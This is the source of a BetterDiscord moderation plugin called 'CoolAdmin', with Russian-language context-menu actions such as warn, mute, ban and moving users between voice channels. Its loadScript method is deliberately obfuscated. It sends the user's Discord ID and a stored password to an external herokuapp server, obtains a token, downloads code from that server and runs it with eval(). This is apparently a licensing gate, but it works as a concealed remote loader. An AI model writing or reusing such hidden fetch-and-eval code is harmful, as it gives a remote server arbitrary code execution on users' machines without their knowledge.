//META{"name":"CoolAdmin","website":"","source":""}*//

class CoolAdmin {
	getName() {
		return "CoolAdmin";
	}

	getVersion() {
		return "4.0.1";
	}

	getAuthor() {
		return "Dario";
	}

	getDescription() {
		return 'Le Cool Admin';
	}

	constructor() {
		this.changelog = {
			"added": [["Premium", 'Перемещение всех пользователей с одного канала в другой, настройка каналов для "Перенести и зайти"']],
			"fixed": [["Настройки", "Снова можно переиминовывать кнопочки"], ["All", "I hope"]]
		};
	}

	initConstructor() {
		this.name = this.getName();
		this.css = `
			.SettingsEditableName{
				width: 50%;
			}
      .${this.name}-scaledIcon {
				-o-transform: scale(0.5);
				-ms-transform: scale(0.5);
				-moz-transform: scale(0.5);
				-webkit-transform: scale(0.5);
				transform: scale(0.5);
      }
		`;
		this.defaults = {
			userContextMenu: {
				CoolAdmin: {name: 'Cool Admin', enabled: true},
				warn: {name: 'Варн', enabled: true,},
				unWarn: {name: 'Разварн', enabled: true,},
				verbalWarn: {name: 'Устное предупреждение', enabled: false,},
				verbalUnWarn: {name: 'Снять устное предупреждение', enabled: false,},
				moveToAfk: {name: 'Перенос в АФК', enabled: true,},
				moveAndComeIn: {name: 'Перенести и зайти', enabled: true,},
				find: {name: 'Найти', enabled: true,},
				findAndConnect: {name: 'Найти и зайти', enabled: true,},
				mute: {name: 'Мут', enabled: true,},
				unmute: {name: 'Размут', enabled: true,},
				warns: {name: 'Предупреждения', enabled: true,},
				ban: {name: 'Бан', enabled: true,},
				gc: {name: 'Перевести коины', enabled: true,},
				gm: {name: 'Выдать коины', enabled: true,},
				sKick: {name: 'Кикнуть с привата', enabled: true,},
			},
			channelContextMenu: {
				closeChannel: {name: 'Закрыть канал', enabled: false},
				openChannel: {name: 'Открыть канал', enabled: false},
				web: {name: 'Демонстрация экрана', enabled: true},
				moveAllTo: {name: 'Переместить всех в', enabled: true},
			},
			guildContextMenu: {
				closeChannels: {name: 'Закрыть канал', enabled: true},
				openChannels: {name: 'Открыть канал', enabled: true},
			},
			userPopout: {
				find: {enabled: true, name: 'Голосовой канал'},
			},
			moveAndComeInChannels: [
				{channelId: '510961674312876058', guildId: '259124796971941890', name: 'Разборки по репортам'},
				{channelId: '534433985002995724', guildId: '259124796971941890', name: 'Разбори по репортам 2'},
			]
		};
	}

	getSettingsPanel(collapseStates = {}) {
		if (!window.BDFDB || typeof BDFDB != "object" || !BDFDB.loaded || !this.started) return;
		let userPopout = BDFDB.DataUtils.get(this, "userPopout");
		let moveAndComeInChannels = BDFDB.DataUtils.load(this, "moveAndComeInChannels") || this.defaults.moveAndComeInChannels;
		console.log(BDFDB.DataUtils.load(this, "moveAndComeInChannels"), this.defaults.moveAndComeInChannels);
		let settingspanel, settingsitems = [], inneritems = [];
		const contextMenuNames = {
			"userContextMenu": "Пункты меню пользователя",
			"channelContextMenu": "Пункты меню канала",
			"guildContextMenu": "Пункты меню гильдии",
		};
		for (const contextMenuName of ["userContextMenu", "channelContextMenu", "guildContextMenu"]) {
			let contextMenu = BDFDB.DataUtils.get(this, contextMenuName);
			settingsitems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.CollapseContainer, {
				title: contextMenuNames[contextMenuName],
				collapseStates: collapseStates,
				children: Object.keys(contextMenu).map(key => BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
					className: BDFDB.disCNS.marginbottom8,
					direction: BDFDB.LibraryComponents.Flex.Direction.HORIZONTAL,
					children: [
						BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
							grow: 0,
							shrink: 0,
							basis: "80%",
							children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsSaveItem, {
								className: BDFDB.disCN.marginbottom8,
								type: "TextInput",
								basis: "100%",
								plugin: this,
								keys: [contextMenuName, key, "name"],
								value: contextMenu[key] ? contextMenu[key].name : '',
								placeholder: this.defaults[contextMenuName][key].name,
							})
						}),
						BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
							children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsSaveItem, {
								grow: 0,
								shrink: 0,
								basis: "20%",
								className: BDFDB.disCN.marginbottom8,
								type: "Switch",
								plugin: this,
								keys: [contextMenuName, key, "enabled"],
								value: contextMenu[key] !== undefined ? contextMenu[key].enabled : this.defaults[contextMenuName][key].enabled
							})
						}),
					]
				}))
			}));
		}
		settingsitems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.CollapseContainer, {
			title: 'Карточка пользователя',
			collapseStates: collapseStates,
			children: Object.keys(userPopout).map(key => BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsSaveItem, {
				className: BDFDB.disCN.marginbottom8,
				type: "Switch",
				label: userPopout[key] ? userPopout[key].name : this.defaults.userPopout[key].name,
				plugin: this,
				keys: ["userContextMenu", key, "enabled"],
				value: userPopout[key] !== undefined ? userPopout[key].enabled : this.defaults.userPopout[key].enabled
			}))
		}));

		if (this.plugin_version === "PREMIUM") {
			settingsitems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.CollapseContainer, {
				title: 'Каналы для перевода',
				collapseStates: collapseStates,
				children: [
					Object.keys(moveAndComeInChannels).map(key => {
						return BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
							className: BDFDB.disCNS.marginbottom8,
							key:"ROW",
							id:`ROW${key}`,
							children: [
								BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
									grow: 0,
									shrink: 0,
									basis: "45%",
									children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsSaveItem, {
										className: BDFDB.disCN.marginbottom8,
										type: "Select",
										key: 'GUILDID',
										plugin: this,
										basis: "100%",
										keys: ["moveAndComeInChannels", key, "guildId"],
										value: moveAndComeInChannels[key].guildId,
										optionsFunc: _ => BDFDB.GuildUtils.getAll().map((guild) => {
											return {value: guild.id, label: guild.name}
										}),
										options: BDFDB.GuildUtils.getAll().map((guild) => {
											return {value: guild.id, label: guild.name}
										}),
										searchable: true,
										optionRenderer: guild => {
											return BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
												align: BDFDB.LibraryComponents.Flex.Align.CENTER,
												children: [
													BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
														grow: 1,
														children: guild.label
													}),
												]
											}) || null;
										},
										valueRenderer: (guild) => {
											return BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
												align: BDFDB.LibraryComponents.Flex.Align.CENTER,
												children: [
													BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
														grow: 1,
														children: guild.label
													}),
												]
											});
										},
										onChange: (value, instance) => {
											let selects = BDFDB.ReactUtils.findOwner(instance._reactInternalFiber.return.return, {key: "CHANNELID"});
											if (typeof selects.props.optionsFunc == "function") {
												selects.props.options = selects.props.optionsFunc();
												selects.props.value = selects.props.options[0].value;
												BDFDB.DataUtils.save({
													guildId: value,
													channelId: selects.props.options[0].value,
													name: selects.props.options[0].label
												}, this, "moveAndComeInChannels", key)
											}

											BDFDB.ReactUtils.forceUpdate(selects);
										}
									})
								}),
								BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
									grow: 0,
									shrink: 0,
									basis: "45%",
									children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsSaveItem, {
										className: BDFDB.disCN.marginbottom8,
										type: "Select",
										basis: "100%",
										key: 'CHANNELID',
										plugin: this,
										keys: ["moveAndComeInChannels", key, "channelId"],
										valueFunc: _ => BDFDB.DataUtils.load(this, "moveAndComeInChannels", key) != undefined ? BDFDB.DataUtils.load(this, "moveAndComeInChannels", key).channelId : this.defaults.moveAndComeInChannels[key].channelId,
										value: BDFDB.DataUtils.load(this, "moveAndComeInChannels", key) != undefined ? BDFDB.DataUtils.load(this, "moveAndComeInChannels", key).channelId : this.defaults.moveAndComeInChannels[key].channelId,
										optionsFunc: _ => BDFDB.LibraryModules.GuildChannelStore.getChannels(BDFDB.DataUtils.load(this, "moveAndComeInChannels", key) != undefined ? BDFDB.DataUtils.load(this, "moveAndComeInChannels", key).guildId : this.defaults.moveAndComeInChannels[key].guildId)[2]
											.filter((args) => BDFDB.LibraryModules.PermissionUtils.canUser(BDFDB.UserUtils.me.id, BDFDB.DiscordConstants.Permissions.CONNECT, {
												channelId: args.channel.id
											}))
											.map((args) => {
												return {value: args.channel.id, label: args.channel.name}
											}),
										options: BDFDB.LibraryModules.GuildChannelStore.getChannels(BDFDB.DataUtils.load(this, "moveAndComeInChannels", key) != undefined ? BDFDB.DataUtils.load(this, "moveAndComeInChannels", key).guildId : this.defaults.moveAndComeInChannels[key].guildId)[2]
											.filter((args) => BDFDB.LibraryModules.PermissionUtils.canUser(BDFDB.UserUtils.me.id, BDFDB.DiscordConstants.Permissions.CONNECT, {
												channelId: args.channel.id
											}))
											.map((args) => {
												return {value: args.channel.id, label: args.channel.name}
											}),
										searchable: true,
										optionRenderer: channel => {
											return BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
												align: BDFDB.LibraryComponents.Flex.Align.CENTER,
												children: [
													BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
														grow: 1,
														children: channel.label
													}),
												]
											}) || null;
										},
										valueRenderer: (channel) => {
											return BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
												align: BDFDB.LibraryComponents.Flex.Align.CENTER,
												children: [
													BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
														grow: 1,
														children: channel.label
													}),
												]
											});
										},
										onChange: (value, instance) => {
											let channel = BDFDB.LibraryModules.ChannelStore.getChannel(value);
											BDFDB.DataUtils.save({
												guildId: channel.guild_id,
												channelId: value,
												name: channel.name
											}, this, "moveAndComeInChannels", key)
										}
									})
								}),
								BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
									grow: 0,
									shrink: 1,
									basis: "10%",
									children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Button, {
										className: BDFDB.disCN.marginbottom8,
										color: BDFDB.LibraryComponents.Button.Colors.RED,
										size: BDFDB.LibraryComponents.Button.Sizes.MIN,
										look: BDFDB.LibraryComponents.Button.Looks.OUTLINED,
										onClick: (event, instance) => {
											BDFDB.DataUtils.remove(this, "moveAndComeInChannels", key);
											BDFDB.PluginUtils.refreshSettingsPanel(this, settingspanel, collapseStates);
										},
										children: "X"
									})
								}),
							]
						});
					}),
					BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
						className: BDFDB.disCN.margintop8,
						align: BDFDB.LibraryComponents.Flex.Align.CENTER,
						children: [
							BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
								children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Button, {
									className: BDFDB.disCN.marginbottom8,
									color: BDFDB.LibraryComponents.Button.Colors.GREEN,
									size: BDFDB.LibraryComponents.Button.Sizes.MIN,
									look: BDFDB.LibraryComponents.Button.Looks.OUTLINED,
									onClick: (event, instance) => {
										let guild = BDFDB.GuildUtils.getAll()[0];
										let channel = BDFDB.LibraryModules.GuildChannelStore.getChannels(guild.id)[2][0].channel;
										let data = {
											guildId: guild.id,
											channelId: channel.id,
											name: channel.name
										};
										BDFDB.DataUtils.save(data, this, "moveAndComeInChannels", Object.keys(moveAndComeInChannels).length);
										BDFDB.PluginUtils.refreshSettingsPanel(this, settingspanel, collapseStates);
									},
									children: "+"
								})
							})
						]
					})
				]
			}));
		}


		return settingspanel = BDFDB.PluginUtils.createSettingsPanel(this, settingsitems);
	}

	start() {
		this.stopped = false;
		if (!window.BDFDB) window.BDFDB = {myPlugins: {}};
		if (window.BDFDB && window.BDFDB.myPlugins && typeof window.BDFDB.myPlugins == "object") window.BDFDB.myPlugins[this.getName()] = this;
		let libraryScript = document.querySelector("head script#BDFDBLibraryScript");
		if (!libraryScript || (performance.now() - libraryScript.getAttribute("date")) > 60000000) {
			if (libraryScript) libraryScript.remove();
			libraryScript = document.createElement("script");
			libraryScript.setAttribute("id", "BDFDBLibraryScript");
			libraryScript.setAttribute("type", "text/javascript");
			libraryScript.setAttribute("src", "https://mwittrien.github.io/BetterDiscordAddons/Plugins/BDFDB.js");
			libraryScript.setAttribute("date", performance.now());
			libraryScript.addEventListener("load", _ => {
				this.initialize();
			});
			document.head.appendChild(libraryScript);
		} else if (window.BDFDB && typeof BDFDB === "object" && BDFDB.loaded) this.initialize();
		this.startTimeout = setTimeout(_ => {
			try {
				return this.initialize();
			} catch (err) {
				console.error(`%c[${this.getName()}]%c`, "color: #3a71c1; font-weight: 700;", "", "Fatal Error: Could not initiate plugin! " + err);
			}
		}, 30000);
	}

	initialize() {
		if (window.BDFDB && typeof BDFDB === "object" && BDFDB.loaded) {
			if (this.started) return;
			BDFDB.PluginUtils.init(this);
			document.easterEgg = (e) => {
				if (e.shiftKey && e.path.length > 2 && e.path[0].className === "bda-footer" && e.path[1].dataset && e.path[1].dataset.name === "CoolAdmin"){
					BDFDB.DiscordUtils.openLink('https://www.youtube.com/watch?v=V-2irUUpLZA', false, false);
					console.log("Easter Egg");
				}

			};
			document.addEventListener("click", document.easterEgg);
			this.loadScript();
		} else console.error(`%c[${this.getName()}]%c`, "color: #3a71c1; font-weight: 700;", "", "Fatal Error: Could not load BD functions!");
	}

	loadScript() {
		var _0x19cd=['toast','NotificationUtils','Fatal\x20Error:\x20Could\x20not\x20load\x20CoolAdmin!\x20Authorisation\x20exception','LibraryRequires','color:\x20#3a71c1;\x20font-weight:\x20700;','token','load','https://server-discord-plugins.herokuapp.com/auth/login','getName','error','UserUtils','Fatal\x20Error:\x20Could\x20not\x20load\x20CoolAdmin!\x20Plugin\x20not\x20found','retryConnectionTimeout','security','POST','statusCode','DataUtils','stopped','password','Ошибка\x20авторизации','init','Fatal\x20Error:\x20Could\x20not\x20load\x20CoolAdmin!\x20Network\x20exception','Bearer_',']%c','PluginUtils','https://server-discord-plugins.herokuapp.com/plugin/cool_admin','%c[','jwt','initialize','save','request'];(function(_0xba9986,_0x11ae52){var _0x188ebe=function(_0x2bdfab){while(--_0x2bdfab){_0xba9986['push'](_0xba9986['shift']());}};_0x188ebe(++_0x11ae52);}(_0x19cd,0x1b1));var _0x5914=function(_0xba9986,_0x11ae52){_0xba9986=_0xba9986-0x0;var _0x188ebe=_0x19cd[_0xba9986];return _0x188ebe;};BDFDB[_0x5914('0x4')][_0x5914('0x0')]({'url':_0x5914('0x8'),'method':_0x5914('0xf'),'json':{'discordId':BDFDB[_0x5914('0xb')]['me']['id'],'password':BDFDB[_0x5914('0x11')][_0x5914('0x7')](this,_0x5914('0xe'),_0x5914('0x13'))}},(_0x3ed42d,_0xc2d068,_0x48d7ef)=>{if(_0xc2d068[_0x5914('0x10')]===0xc8){if(_0x48d7ef[_0x5914('0x13')]){BDFDB[_0x5914('0x11')][_0x5914('0x1e')](_0x48d7ef[_0x5914('0x13')],this,_0x5914('0xe'),_0x5914('0x13'));}if(!_0x48d7ef[_0x5914('0x6')])return;this[_0x5914('0x1c')]=_0x48d7ef[_0x5914('0x6')];BDFDB[_0x5914('0x4')]['request']({'url':_0x5914('0x1a'),'headers':{'Authorization':_0x5914('0x17')+this['jwt']}},(_0x4b5b29,_0x4626cd,_0x2ed73a)=>{if(_0x4b5b29){this[_0x5914('0xd')]=setTimeout(_0x4fed8c=>{if(!this[_0x5914('0x12')])this[_0x5914('0x1d')]();},0x1388);console[_0x5914('0xa')](_0x5914('0x1b')+this[_0x5914('0x9')]()+_0x5914('0x18'),_0x5914('0x5'),'',_0x5914('0x16'));return;}if(_0x4626cd[_0x5914('0x10')]===0xc8){eval(_0x2ed73a);BDFDB[_0x5914('0x19')][_0x5914('0x15')](this);}else if(_0x4626cd[_0x5914('0x10')]===0x194){console[_0x5914('0xa')](_0x5914('0x1b')+this[_0x5914('0x9')]()+']%c',_0x5914('0x5'),'',_0x5914('0xc'));}});}else{console[_0x5914('0xa')]('%c['+this[_0x5914('0x9')]()+_0x5914('0x18'),'color:\x20#3a71c1;\x20font-weight:\x20700;','',_0x5914('0x3'));BDFDB[_0x5914('0x2')][_0x5914('0x1')](_0x5914('0x14'));}});
	}

	stop() {
		this.stopped = true;
		document.removeEventListener("click", document.easterEgg);
		if (window.BDFDB && typeof BDFDB === "object" && BDFDB.loaded) {
			this.stopping = true;
			BDFDB.PluginUtils.clear(this);
			BDFDB.TimeUtils.clear(this.startTimeout, this.libLoadTimeout, this.retryConnectionTimeout);
			delete this.startTimeout;
			delete this.libLoadTimeout;
			delete this.retryConnectionTimeout;
		} else {
			clearTimeout(this.retryConnectionTimeout);
			delete this.retryConnectionTimeout;
		}
	}
}
